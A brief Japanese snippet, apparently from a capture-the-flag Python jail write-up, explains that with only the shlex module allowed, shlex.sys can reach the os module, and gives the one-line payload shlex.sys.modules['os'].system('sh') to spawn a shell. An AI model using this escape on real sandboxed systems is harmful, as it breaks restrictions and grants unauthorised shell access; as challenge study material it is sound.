`shlex`モジュールしか利用できないが、`shlex.sys`が利用できる。これを用いて`os`モジュールを呼び出す。

```
shlex.sys.modules["os"].system("sh")
```